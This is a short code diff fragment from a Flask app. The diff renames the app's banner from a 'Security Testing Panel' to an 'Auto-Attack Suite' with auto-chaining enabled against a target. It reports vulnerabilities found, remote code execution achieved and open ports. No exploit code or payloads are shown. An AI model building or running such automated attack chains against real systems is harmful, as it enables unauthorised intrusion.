+            'vulnerabilities_found': len(attack_state['attack_history']),
+            'rce_achieved': attack_state['rce_verified'],
+            'open_ports': len(attack_state['open_ports']),
+        }
     })
-
-# ============================================================
-# CLEAR CACHE
-# ============================================================
-@app.route('/clear-cache')
-def clear_cache():
-    cache.clear()
-    return jsonify({'message': 'Cache cleared', 'timestamp': datetime.now().isoformat()})
 
 # ============================================================
 # STARTUP
@@ -1133,9 +815,10 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
     print(f"""
 ╔══════════════════════════════════════════════╗
-║   🔬 GoldMedal.cc Security Testing Panel    ║
-║   Running on port {port}                      ║
+║   🔬 GoldMedal.cc Auto-Attack Suite v3.0    ║
+║   Port: {port}                              ║
 ║   Target: {TARGET}                ║
+║   Auto-Chain: ENABLED                      ║
 ║   ⚠️  Ethical Testing Only                   ║
 ╚══════════════════════════════════════════════╝
     """)
